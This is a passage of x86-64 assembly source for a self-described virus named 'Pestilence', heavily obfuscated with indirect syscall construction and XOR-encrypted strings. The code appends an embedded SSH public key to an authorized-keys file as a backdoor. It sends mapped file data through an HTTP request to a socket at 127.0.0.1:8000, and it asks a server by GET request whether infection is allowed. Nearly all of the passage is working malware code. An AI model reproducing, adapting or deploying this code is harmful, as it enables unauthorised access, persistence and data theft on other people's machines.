add rsp, 8
mov r11, rax
pop rax
; for every new line
_findNewline:
cmp byte [r11], 0xa 
je _cmpLine
inc r11
loop _findNewline
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 316]
or rax, r14 
pop r14
pop r15
; mov rsi, back
lea rsi, [back]
push rax
push 1
call mov2
add rsp, 8
mov rdx, rax
pop rax
syscall
jmp _notFound
; cmp the line with pub ssh key
_cmpLine:
mov byte [r11], 0 
push rax
push r11
call mov1
add rsp, 8
mov rdi, rax
pop rax
sub rdi, sshPubLen - 1 
lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
push rax
push sshPubLen
call mov4
add rsp, 8
mov rsi, rax
pop rax
_decCmpLine:
call _decrypt_str
push rax
push rax
call mov3
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rcx
call _strcmp
pop rcx
test rax, rax 
je _closeSsh
inc r11
dec rcx
jnz _findNewline
; loop _findNewline
; if not found write it
_notFound:
push rax
push r9
call mov3
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 316]
or rax, r14 
pop r14
pop r15
; lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
push rax
push sshPubLen
call mov2
add rsp, 8
mov rsi, rax
pop rax
_decNotFound:
call _decrypt_str
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push sshPubLen
call mov1
add rsp, 8
mov rdx, rax
pop rax
syscall
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push r14
call mov2
add rsp, 8
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 316]
or rax, r14 
pop r14
pop r15
lea rsi, [rel back]
push rax
push 1
call mov3
add rsp, 8
mov rdx, rax
pop rax
syscall
_closeSsh:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 82]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 186]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 290]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 394]
or rax, r14 
pop r14
pop r15
push rax
push r9
call mov2
add rsp, 8
mov rdi, rax
pop rax
syscall
jmp _returnLeave
_initSocket:
_creatSocket:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 85]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 189]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 293]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 397]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 331]
or rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 316]
or rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
test rax, rax
js _return
push rax
push rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
_connectSocket:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 86]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 190]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 294]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 398]
or rax, r14 
pop r14
pop r15
lea rsi, [rel sockaddr]
push rax
push 16
call mov2
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js _closeSock
push rdi
call mov1
add rsp, 8
ret
_munmapExtractBuffer:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 84]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 188]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 292]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 396]
or rax, r14 
pop r14
pop r15
push rax
push rsi
call mov2
add rsp, 8
mov rdi, rax
pop rax
push rax
push rdx
call mov3
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rdi
; (rdi: socket)
_closeSock:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 82]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 186]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 290]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 394]
or rax, r14 
pop r14
pop r15
syscall
push -1
call mov3
add rsp, 8
ret
; extrait les donnees des fichiers via http
_extractData:
; r12 -> maped file_date
push rax
push rax
call mov2
add rsp, 8
mov r12, rax
pop rax
push rsi
call _creatSocket
pop rsi
push rax
push rax
call mov1
add rsp, 8
mov r13, rax
pop rax
_checkFd:
cmp r13, 0 
jl _return
_mmapBuffer:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 69]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 173]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 277]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 381]
or rax, r14 
pop r14
pop r15
xor rdi, rdi
push rsi
push rax
push rsi
push headerStartLen
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push headerEndLen
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push 10
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
call mov3
add rsp, 8
mov r15, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 331]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 331]
or r10, r14 
pop r14
pop r15
xor r8, r8
xor r9, r9
syscall
_copyData:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
push rax
push rax
call mov4
add rsp, 8
mov r14, rax
pop rax
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel headerStart]
push rax
push rsi
push rax
push headerStartLen
call mov3
add rsp, 8
mov rsi, rax
pop rax
_dec_copyD:
call _decrypt_str
push rax
push rax
call mov1
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
call _strcpy
pop rax
push rax
push rax
push rsi
push headerStartLen - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
call _itoa
lea rdi, [rel headerEnd]
call _strcpy
push rax
push rsi
push headerEndLen - 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push r12
call mov2
add rsp, 8
mov rdi, rax
pop rax
pop rcx
call _strncpy
_sendTo:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 87]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 191]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 295]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 399]
or rax, r14 
pop r14
pop r15
push rax
push r13
call mov3
add rsp, 8
mov rdi, rax
pop rax
push rax
push r14
call mov2
add rsp, 8
mov rsi, rax
pop rax
push rax
push r15
call mov4
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
push rdi
jmp _munmapExtractBuffer
; manage WciGNPwfF
_isInfectionAllow:
push rbp
mov rbp, rsp 
call _creatSocket
cmp rax, 0 
jl _allow
_sendInfectionRequest:
;rdi == sockfd
push rax
push rax
call mov2
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 87]
shl r14, 0x18
push r14
call mov3
add rsp, 8
movzx r14, byte [r15 + 191]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 295]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 399]
or rax, r14 
pop r14
pop r15
push rax
push rdi
lea rdi, [rel headerGet]
push rax
push headerGetLen
call mov4
add rsp, 8
mov rsi, rax
pop rax
_dec_sendInf:
call _decrypt_str
push rax
push rax
call mov1
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push headerGetLen
call mov3
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
xor r9, r9
syscall
test rax, rax
js _allow
_nanoSleep:
push rdi
push 35
call mov2
add rsp, 8
lea rdi, [rel timespec]
xor rsi, rsi
syscall
pop rdi
_recvInfectionRequest:
;* rdi == sockfd
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 88]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 192]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 296]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 400]
or rax, r14 
pop r14
pop r15
sub rsp, 200 
mov rsi, rsp
push rax
push 200
call mov4
add rsp, 8
mov rdx, rax
pop rax
xor r10, r10
syscall
test rax, rax
js _allow
_infectionRequestRespons:
;* rdi == sockfd
mov rsi, rsp
call _strlen
push rax
push rsp
push rax
call add1
add rsp, 8
pop rsp
mov rsp, rax
pop rax
sub rsp, 2 
cmp WORD [rsp], 0x4b4f 
jne _notAllow
_allow:
call _closeSock
push 0
call mov1
add rsp, 8
jmp _returnLeave
_notAllow:
call _closeSock
push -1
call mov4
add rsp, 8
jmp _returnLeave
;;**;;
mov4:
push rbx
push rcx
mov rcx, qword [rsp + 8 + 16]

mov rax, 0
mov rbx, 0
cmpxchg rbx, rcx
mov rax, rbx
pop rcx
pop rbx
ret
mov1:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, (64 << 8) | 0 ; flag pour le mov de bextr
bextr rax, rcx, rdx ; mov rax, rcx

pop rdx
pop rcx
ret
mov2:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, -1
bzhi rax, rcx, rdx

pop rdx
pop rcx
ret
mov3:
push rcx
push rbx
mov rbx, qword [rsp + 8 + 16]

mov rax, 0
mov rcx, 0x3d42f
cmpxchg rbx, rcx

pop rbx
pop rcx
ret
add1:
push rcx
mov rax, qword [rsp + 16 + 8]
mov rcx, qword [rsp + 8 + 8]

test rcx, rcx ; is rcx == 0 ?
jnz sub
jnc do_adc
jmp reverseCF

sub:
sub rcx, 1
jnc reverseCF ; Jump if Carry Flag is Not set (CF=0)
jmp do_adc ; Jump to ADC instruction
reverseCF: 
cmc ; Complement CF, making it 1
do_adc: ; Perform ADC with prepared carry flag
adc rax, rcx; RAX = RAX + rcx + CF

pop rcx
ret
; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
push SYS_MMAP
call mov2
add rsp, 8
push rax
push 0x0
call mov3
add rsp, 8
mov rdi, rax
pop rax
push rax
push 0x1a0
call mov3
add rsp, 8
mov rsi, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call mov2
add rsp, 8
mov rdx, rax
pop rax
push rax
push 0x22
call mov4
add rsp, 8
mov r10, rax
pop rax
push rax
push -1
call mov1
add rsp, 8
mov r8, rax
pop rax
push rax
push 0x0
call mov4
add rsp, 8
mov r9, rax
pop rax
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000001
mov dword [rax + 80], 0x00000000
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00460000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00000000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00009800
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x02000000
mov dword [rax + 208], 0x00000000
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x00000000
mov dword [rax + 232], 0x004c0000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00021000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x00000000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x4b000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00000000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x1f400000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00009600
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x60000000
mov dword [rax + 312], 0x6e000040
mov dword [rax + 316], 0x00000001
mov dword [rax + 320], 0x00000101
mov dword [rax + 324], 0x2e010100
mov dword [rax + 328], 0x02010001
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00450100
mov dword [rax + 340], 0x01200000
mov dword [rax + 344], 0x00010100
mov dword [rax + 348], 0x01000001
mov dword [rax + 352], 0x00580005
mov dword [rax + 356], 0x0100010a
mov dword [rax + 360], 0x0a001001
mov dword [rax + 364], 0x23000101
mov dword [rax + 368], 0x4f02c8c8
mov dword [rax + 372], 0x00010000
mov dword [rax + 376], 0x01000001
mov dword [rax + 380], 0x3c30090a
mov dword [rax + 384], 0x401f0209
mov dword [rax + 388], 0x0a0d007f
mov dword [rax + 392], 0x08038000
mov dword [rax + 396], 0x2c2a290b
mov dword [rax + 400], 0xd9654d2d
mov dword [rax + 404], 0x40020100
mov dword [rax + 408], 0x12080400
mov dword [rax + 412], 0x42071713
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len key
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> key
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
push rax
push rdi
call mov1
add rsp, 8
mov rbx, rax
pop rax
push rax
push rsi
call mov3
add rsp, 8
mov r12, rax
pop rax
; addr = NULL (let kernel choose)
xor rdi, rdi 
; PROT_READ | PROT_WRITE = 1 | 2 = 3
push rax
push 0x03
call mov2
add rsp, 8
mov rdx, rax
pop rax
; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
push rax
push 0x22
call mov3
add rsp, 8
mov r10, rax
pop rax
; fsMfH53 = -1
push rax
push -1
call mov1
add rsp, 8
mov r8, rax
pop rax
; offset = 0
xor r9, r9 
; syscall number for mmap
push 9
call mov2
add rsp, 8
syscall
cmp rax, 0
jl _decrypt_loop_end
push rax
push rax
call mov4
add rsp, 8
mov r11, rax
pop rax
lea rsi, key
push rax
push 0xc
call mov4
add rsp, 8
mov r9, rax
pop rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
push rcx
call mov2
add rsp, 8
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
; r10 == key[rcx % key_len]
movzx r10, byte [rsi + rdx] 
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
push r11
call mov3
add rsp, 8
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
; strcpy(dst:rsi src: rdi)
_strcpyNoNull:
xor rcx, rcx
strcpy_loop:
cmp byte[rdi + rcx], 0 
je strcpy_loop_end
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
push rax
push rcx
push 1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp strcpy_loop
strcpy_loop_end:
ret
_strcpy:
call _strcpyNoNull
mov byte [rsi + rcx], 0 
ret
; strncpy(dst:rsi, src: rdi, count: rcx)
_strncpy:
sub rcx, 1 
_strncpyLoop:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop _strncpyLoop
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret
; strlen(str:rsi)
_strlen:
xor rcx, rcx
ft_strlen_loop:
cmp byte [rsi + rcx], 0 
je ft_strlen_end
inc rcx
jmp ft_strlen_loop
ft_strlen_end:
push rcx
call mov1
add rsp, 8
ret
; strcmp(rdi, rsi)
_strcmp:
xor rcx, rcx
xor rax, rax
strcmp_loop:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl strcmp_loop_end
je strcmp_loop_end
jg strcmp_loop_end
cmp al, 0 
je strcmp_loop_end
push rax
push rcx
push 1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp strcmp_loop
strcmp_loop_end:
movzx rax, al
movzx r8, bl
sub rax, r8
ret
; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
push rax
push 10
call mov2
add rsp, 8
mov r9, rax
pop rax
call _itoaLoop
ret
_itoaLoop:
cmp rax, 9 
jg _itoaRecursif
push rax
push byte rax
call mov3
add rsp, 8
mov [rsi], rax
pop rax
add byte [rsi], 48 
inc rsi
ret
_itoaRecursif:
push rax
xor rdx, rdx
div r9
call _itoaLoop 
pop rax
push rax
xor rdx, rdx
div r9
push rdx
call mov4
add rsp, 8
call _itoaLoop 
pop rax
ret
push rax
push rax
call mov1
add rsp, 8
mov [rsi + rcx], rax
pop rax
_unmap_close_inf:
mov rdi, INF(WciGNPwfF.FLDLq7)
mov rsi, INF(WciGNPwfF.QnIa96RO7)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 84]
shl r14, 0x18
push r14
call mov3
add rsp, 8
movzx r14, byte [r15 + 188]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 292]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 396]
or rax, r14 
pop r14
pop r15
syscall
jmp _close_file_inf
_close_file_inf:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 82]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 186]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 290]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 394]
or rax, r14 
pop r14
pop r15
mov rdi, INF(WciGNPwfF.Od0nn6UtIm)
syscall
mov qword INF(WciGNPwfF.Od0nn6UtIm), -1
jmp _returnLeave
_exit:
push 60
call mov2
add rsp, 8
xor rdi, rdi
syscall
key db 0x5C, 0x46, 0x65, 0x3D, 0x79, 0x7B, 0x7D, 0x4C, 0x21, 0x38, 0x45, 0x5F
dir1 db 0x73, 0x32, 0x08, 0x4D, 0x56, 0x0F, 0x18, 0x3F, 0x55, 0x38
dir1Len equ $ - dir1
dir2 db 0x73, 0x32, 0x08, 0x4D, 0x56, 0x0F, 0x18, 0x3F, 0x55, 0x0A, 0x45
dir2Len equ $ - dir2
back db 9, 0x0 
backLen equ $ - back
slash db 0x73, 0x46
sshFile db 0x73, 0x34, 0x0A, 0x52, 0x0D, 0x54, 0x53, 0x3F, 0x52, 0x50, 0x6A, 0x3E, 0x29, 0x32, 0x0D, 0x52, 0x0B, 0x12, 0x07, 0x29, 0x45, 0x67, 0x2E, 0x3A, 0x25, 0x35, 0x65
sshFile_len equ $ - sshFile
sshPub db 0x2F, 0x35, 0x0D, 0x10, 0x1C, 0x1F, 0x4F, 0x79, 0x14, 0x09, 0x7C, 0x7F, 0x1D, 0x07, 0x24, 0x7C, 0x3A, 0x48, 0x33, 0x36, 0x40, 0x7B, 0x74, 0x33, 0x06, 0x02, 0x2C, 0x0C, 0x37, 0x2F, 0x38, 0x79, 0x60, 0x79, 0x04, 0x1E, 0x15, 0x0D, 0x06, 0x4E, 0x3D, 0x19, 0x14, 0x36, 0x40, 0x0B, 0x11, 0x2C, 0x6A, 0x04, 0x5C, 0x69, 0x09, 0x18, 0x18, 0x24, 0x59, 0x52, 0x1C, 0x67, 0x2C, 0x25, 0x35, 0x54, 0x13, 0x15, 0x39, 0x34, 0x63, 0x48, 0x30, 0x36, 0x19, 0x2D, 0x0A, 0x49, 0x2B, 0x38, 0x13, 0x7C, 0x01, 0x5F, 0x2A, 0x2B, 0x28, 0x2F, 0x00, 0x7D, 0x1D, 0x1E, 0x1F, 0x25, 0x40, 0x56, 0x45
sshPubLen equ $ - sshPub
sockaddr:
dw 2 
dw 0x401F 
dd 0x100007F 
dq 0 
headerStart db 0x0C, 0x09, 0x36, 0x69, 0x59, 0x54, 0x18, 0x34, 0x55, 0x4A, 0x24, 0x3C, 0x28, 0x66, 0x2D, 0x69, 0x2D, 0x2B, 0x52, 0x7D, 0x0F, 0x09, 0x48, 0x55, 0x14, 0x29, 0x16, 0x49, 0x43, 0x5B, 0x4C, 0x7E, 0x16, 0x16, 0x75, 0x71, 0x6C, 0x68, 0x54, 0x07, 0x41, 0x4B, 0x4D, 0x7C, 0x2C, 0x32, 0x06, 0x30, 0x32, 0x32, 0x00, 0x53, 0x0D, 0x56, 0x29, 0x35, 0x51, 0x5D, 0x7F, 0x7F, 0x28, 0x23, 0x1D, 0x49, 0x56, 0x0B, 0x11, 0x2D, 0x48, 0x56, 0x48, 0x55, 0x1F, 0x29, 0x0B, 0x49, 0x1C, 0x15, 0x09, 0x61, 0x6D, 0x5D, 0x2B, 0x38, 0x28, 0x2E, 0x5F, 0x1D, 0x79
headerStartLen equ $ - headerStart
headerEnd db 0x0D, 0x0A, 0x0D, 0x0A, 0x0 
headerEndLen equ $ - headerEnd
headerGet db 0x1B, 0x03, 0x31, 0x1D, 0x56, 0x12, 0x13, 0x2A, 0x44, 0x5B, 0x31, 0x36, 0x33, 0x28, 0x45, 0x75, 0x2D, 0x2F, 0x2D, 0x63, 0x10, 0x16, 0x74, 0x52, 0x56, 0x0E, 0x0A, 0x4E, 0x0D, 0x41, 0x5D, 0x7D, 0x13, 0x0F, 0x6B, 0x6F, 0x72, 0x76, 0x4B, 0x0C, 0x43, 0x43, 0x4D, 0x7C, 0x11, 0x35, 0x4F, 0x52, 0x56, 0x46
headerGetLen equ $ - headerGet
timespec:
dq 0 
dq 10000000 
signature db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
signature_len equ $ - signature
_end:
